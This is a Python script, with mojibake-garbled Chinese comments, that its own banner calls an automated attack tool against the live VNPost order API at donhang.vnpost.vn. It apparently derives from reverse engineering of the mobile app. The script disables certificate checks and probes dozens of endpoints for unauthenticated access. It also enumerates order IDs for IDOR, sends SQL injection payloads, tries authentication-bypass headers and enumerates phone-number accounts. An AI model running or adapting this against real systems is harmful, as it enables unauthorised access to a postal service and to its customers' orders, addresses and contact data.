#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ğŸ”¥ VNPost API è‡ªåŠ¨åŒ–æ”»å‡»å·¥å…·
åŸºäºé€†å‘åˆ†æçš„å®Œæ•´APIç«¯ç‚¹
"""

import requests
import json
from typing import Dict, List
import urllib3
urllib3.disable_warnings()

class VNPostAPIExploit:
    """VNPost APIæ”»å‡»å·¥å…·"""
    
    def __init__(self):
        self.base_url = "https://donhang.vnpost.vn/apimobilev34"
        self.session = requests.Session()
        self.session.verify = False
        self.token = None
        
        # ä»é€†å‘åˆ†ææå–çš„å®Œæ•´APIç«¯ç‚¹
        self.endpoints = {
            # è®¤è¯ç›¸å…³
            'LOGIN': '/api/MobileAuthentication/GetAccessToken',
            'REGISTER': '/api/MobileAuthentication/Register',
            'CONFIRM_OTP': '/api/MobileAuthentication/IsValidateOTP',
            'SEND_OTP': '/api/MobileAuthentication/SendRegisterOTP',
            'CHECK_USER_EXISTS': '/api/MobileAuthentication/CheckSoDienThoaiExists',
            'PASSWORD_RESET': '/api/QuenMatKhau/GuiLinkResetMatKhauQuaEmail',
            
            # ç¤¾äº¤ç™»å½•
            'LOGIN_FACEBOOK': 'api/Token/LoginWithFacebook',
            'LOGIN_ZALO': 'api/Token/LoginWithZalo',
            'LOGIN_APPLE': 'api/Token/LoginWithAppleID',
            
            # ç”¨æˆ·ä¿¡æ¯
            'GET_USER_INFO': '/api/NguoiDung/GetThongTinCaNhan',
            'GET_USER_BY_ID': '/api/NguoiDung/GetNguoiDung',
            'CHANGE_PASSWORD': '/api/NguoiDung/UpdateMatKhauCaNhan',
            
            # è®¢å•ç®¡ç† (é«˜ä»·å€¼)
            'LIST_ORDERS': '/api/CustomerOrder/GetListOrderForManagerWithCustomerCode',
            'ORDER_DETAILS': '/api/CustomerOrder/GetDetailOrder',
            'LIST_ORDERS_TODAY': '/api/DailyOrder/GetListOrderByCustomerCode',
            'LIST_ORDERS_RECEIVED': '/api/OrderOfCustomer/LayDonHangNguoiNhan',
            'LIST_ORDERS_DRAFT': '/api/DraftOrder/GetListOrderByCustomerCode',
            'COUNT_ORDERS': '/api/CustomerOrder/GetListCountOrder',
            'CANCEL_ORDER': '/api/DailyOrder/CancelOrder',
            
            # è®¢å•è¯¦æƒ…
            'ORDER_GOODS_JOURNEY': '/api/CustomerOrder/GetGoodsJourneyByItemCode',
            'ORDER_QRCODE': '/api/QRCode/GenerateQRCodeFull',
            'ORDER_BARCODE': '/api/BarCode/GenerateBarCode',
            
            # ç»Ÿè®¡æ•°æ®
            'STATISTICS_ORDERS': '/api/CustomerOrder/GetStatisticsByStatus',
            'STATISTICS_FREIGHT': '/api/CustomerOrder/GetStatisticsFreightFee',
            'STATISTICS_COD': '/api/CustomerOrder/GetStatisticsMoneyCOD',
            
            # åœ°å€å’Œä½ç½®
            'SEARCH_ADDRESS': '/api/DiaChiNguoiDung/SearchAddressByCoordinatesAndKey',
            'RECENT_LOCATIONS': '/api/DiaChiNguoiDung/GetRecentLocations',
            'POSTAL_OFFICES': '/api/BuuCuc/GetAllForDieuTinAutocomplete',
            
            # åˆåŒç®¡ç†
            'LIST_CONTRACTS': '/api/Contract/GetListContractOfAccount',
            'CONTRACT_DETAIL': '/api/Contract/GetContractDetail',
            'CREATE_CONTRACT': '/api/Contract/CreateContractNew',
            
            # é€šçŸ¥
            'NOTIFICATIONS': '/api/Notification/GetNotifications',
            'NOTIFI_FILTER': '/api/Notification/GetNotifiFilter',
            
            # ç³»ç»Ÿé…ç½®
            'GET_DATA_INITIALIZED': '/api/MobileAuthentication/GetCategoryDataV2',
            'APP_SETTING': '/api/SettingConfig/GetAppSetting',
            'DATA_VERSION': '/api/SettingConfig/GetDataVersion',
        }
    
    def test_endpoint_without_auth(self, endpoint_name: str) -> Dict:
        """æµ‹è¯•ç«¯ç‚¹æ˜¯å¦éœ€è¦è®¤è¯"""
        url = self.base_url + self.endpoints[endpoint_name]
        
        print(f"\n[*] æµ‹è¯•: {endpoint_name}")
        print(f"    URL: {url}")
        
        methods = ['GET', 'POST']
        results = {}
        
        for method in methods:
            try:
                if method == 'GET':
                    resp = self.session.get(url, timeout=10)
                else:
                    resp = self.session.post(url, json={}, timeout=10)
                
                results[method] = {
                    'status': resp.status_code,
                    'length': len(resp.text),
                    'vulnerable': resp.status_code not in [401, 403, 404]
                }
                
                if resp.status_code == 200:
                    print(f"    [!!!] {method} æˆåŠŸ! çŠ¶æ€ç : {resp.status_code}")
                    print(f"    å“åº”: {resp.text[:200]}")
                elif resp.status_code in [400, 500]:
                    print(f"    [+] {method} å¯è®¿é—®(é”™è¯¯å“åº”): {resp.status_code}")
                else:
                    print(f"    [-] {method} éœ€è¦è®¤è¯: {resp.status_code}")
                    
            except Exception as e:
                results[method] = {'error': str(e)}
                print(f"    [-] {method} é”™è¯¯: {e}")
        
        return results
    
    def test_idor_vulnerabilities(self) -> List[Dict]:
        """æµ‹è¯•IDORæ¼æ´"""
        print("\n[*] å¼€å§‹IDORæ¼æ´æµ‹è¯•...")
        
        vulnerabilities = []
        
        # æµ‹è¯•è®¢å•IDæšä¸¾
        test_ids = [1, 100, 1000, 9999, 'ABC123', 'VNP001']
        
        for order_id in test_ids:
            url = f"{self.base_url}/api/CustomerOrder/GetDetailOrder?orderId={order_id}"
            try:
                resp = self.session.get(url, timeout=10)
                if resp.status_code == 200:
                    vulnerabilities.append({
                        'type': 'IDOR',
                        'endpoint': url,
                        'id': order_id,
                        'response_length': len(resp.text)
                    })
                    print(f"[!!!] IDORå‘ç°! è®¢å•ID {order_id} å¯è®¿é—®")
            except:
                pass
        
        return vulnerabilities
    
    def test_sql_injection(self, endpoint_name: str) -> List[Dict]:
        """æµ‹è¯•SQLæ³¨å…¥"""
        print(f"\n[*] æµ‹è¯•SQLæ³¨å…¥: {endpoint_name}")
        
        payloads = [
            "' OR '1'='1",
            "1' OR '1'='1' --",
            "admin'--",
            "' UNION SELECT NULL--",
            "1' WAITFOR DELAY '0:0:5'--"
        ]
        
        vulnerabilities = []
        url = self.base_url + self.endpoints[endpoint_name]
        
        for payload in payloads:
            try:
                # æµ‹è¯•GETå‚æ•°
                test_url = f"{url}?id={payload}"
                resp = self.session.get(test_url, timeout=10)
                
                # æ£€æµ‹SQLé”™è¯¯
                sql_errors = [
                    'sql syntax',
                    'mysql',
                    'ora-',
                    'microsoft sql',
                    'unclosed quotation'
                ]
                
                if any(err in resp.text.lower() for err in sql_errors):
                    vulnerabilities.append({
                        'type': 'SQL_INJECTION',
                        'endpoint': url,
                        'payload': payload,
                        'evidence': resp.text[:500]
                    })
                    print(f"[!!!] SQLæ³¨å…¥æ£€æµ‹åˆ°! Payload: {payload}")
                    
            except:
                pass
        
        return vulnerabilities
    
    def test_authentication_bypass(self) -> Dict:
        """æµ‹è¯•è®¤è¯ç»•è¿‡"""
        print("\n[*] æµ‹è¯•è®¤è¯ç»•è¿‡...")
        
        bypass_attempts = []
        
        # 1. ç©ºä»¤ç‰Œæµ‹è¯•
        headers_tests = [
            {},
            {'Authorization': ''},
            {'Authorization': 'Bearer '},
            {'Authorization': 'null'},
            {'Authorization': 'Bearer null'},
            {'X-Auth-Token': 'admin'},
            {'X-API-Key': 'test'},
        ]
        
        test_url = self.base_url + '/api/NguoiDung/GetThongTinCaNhan'
        
        for headers in headers_tests:
            try:
                resp = self.session.get(test_url, headers=headers, timeout=10)
                if resp.status_code == 200:
                    bypass_attempts.append({
                        'headers': headers,
                        'status': resp.status_code,
                        'response': resp.text[:200]
                    })
                    print(f"[!!!] è®¤è¯ç»•è¿‡æˆåŠŸ! Headers: {headers}")
            except:
                pass
        
        return bypass_attempts
    
    def enumerate_users(self, phone_prefix: str = "09") -> List[str]:
        """æšä¸¾ç”¨æˆ·è´¦å·"""
        print(f"\n[*] å¼€å§‹ç”¨æˆ·æšä¸¾...")
        
        valid_users = []
        url = self.base_url + '/api/MobileAuthentication/CheckSoDienThoaiExists'
        
        # æµ‹è¯•è¶Šå—å¸¸è§æ‰‹æœºå·å‰ç¼€
        prefixes = ['090', '091', '092', '093', '094', '095', '096', '097', '098', '099']
        
        for prefix in prefixes[:3]:  # é™åˆ¶æµ‹è¯•æ•°é‡
            test_phone = prefix + '1234567'
            try:
                resp = self.session.post(url, json={'phone': test_phone}, timeout=10)
                if 'exists' in resp.text.lower() or 'true' in resp.text.lower():
                    valid_users.append(test_phone)
                    print(f"[+] å‘ç°ç”¨æˆ·: {test_phone}")
            except:
                pass
        
        return valid_users
    
    def full_vulnerability_scan(self) -> Dict:
        """å®Œæ•´æ¼æ´æ‰«æ"""
        print("\n" + "="*60)
        print("ğŸ”¥ å¼€å§‹VNPost APIå®Œæ•´æ¼æ´æ‰«æ")
        print("="*60)
        
        results = {
            'unauthenticated_endpoints': [],
            'idor_vulns': [],
            'sql_injection': [],
            'auth_bypass': [],
            'user_enum': []
        }
        
        # 1. æµ‹è¯•æœªè®¤è¯è®¿é—®
        print("\n[1] æµ‹è¯•æœªè®¤è¯ç«¯ç‚¹è®¿é—®...")
        for endpoint_name in list(self.endpoints.keys())[:10]:  # æµ‹è¯•å‰10ä¸ª
            result = self.test_endpoint_without_auth(endpoint_name)
            if any(r.get('vulnerable') for r in result.values()):
                results['unauthenticated_endpoints'].append({
                    'endpoint': endpoint_name,
                    'details': result
                })
        
        # 2. IDORæµ‹è¯•
        print("\n[2] æµ‹è¯•IDORæ¼æ´...")
        results['idor_vulns'] = self.test_idor_vulnerabilities()
        
        # 3. è®¤è¯ç»•è¿‡
        print("\n[3] æµ‹è¯•è®¤è¯ç»•è¿‡...")
        results['auth_bypass'] = self.test_authentication_bypass()
        
        # 4. ç”¨æˆ·æšä¸¾
        print("\n[4] æµ‹è¯•ç”¨æˆ·æšä¸¾...")
        results['user_enum'] = self.enumerate_users()
        
        # ç”ŸæˆæŠ¥å‘Š
        self._generate_report(results)
        
        return results
    
    def _generate_report(self, results: Dict):
        """ç”ŸæˆæŠ¥å‘Š"""
        print("\n" + "="*60)
        print("ğŸ“Š æ¼æ´æ‰«ææŠ¥å‘Š")
        print("="*60)
        
        print(f"\næœªè®¤è¯å¯è®¿é—®ç«¯ç‚¹: {len(results['unauthenticated_endpoints'])}")
        print(f"IDORæ¼æ´: {len(results['idor_vulns'])}")
        print(f"è®¤è¯ç»•è¿‡: {len(results['auth_bypass'])}")
        print(f"å¯æšä¸¾ç”¨æˆ·: {len(results['user_enum'])}")
        
        # ä¿å­˜è¯¦ç»†æŠ¥å‘Š
        with open('vnpost_vulnerability_report.json', 'w', encoding='utf-8') as f:
            json.dump(results, f, indent=2, ensure_ascii=False)
        
        print("\n[âœ“] è¯¦ç»†æŠ¥å‘Šå·²ä¿å­˜åˆ°: vnpost_vulnerability_report.json")


if __name__ == "__main__":
    print("""
â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—
â•‘  ğŸ”¥ VNPost API è‡ªåŠ¨åŒ–æ¼æ´æ‰«æå·¥å…· ğŸ”¥                â•‘
â•‘  åŸºäºç§»åŠ¨åº”ç”¨é€†å‘åˆ†æ                                  â•‘
â•‘  ç›®æ ‡: https://donhang.vnpost.vn                       â•‘
â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
    """)
    
    exploit = VNPostAPIExploit()
    results = exploit.full_vulnerability_scan()
    
    print("\n[*] æ‰«æå®Œæˆï¼æ£€æŸ¥ vnpost_vulnerability_report.json æŸ¥çœ‹è¯¦ç»†ç»“æœ")
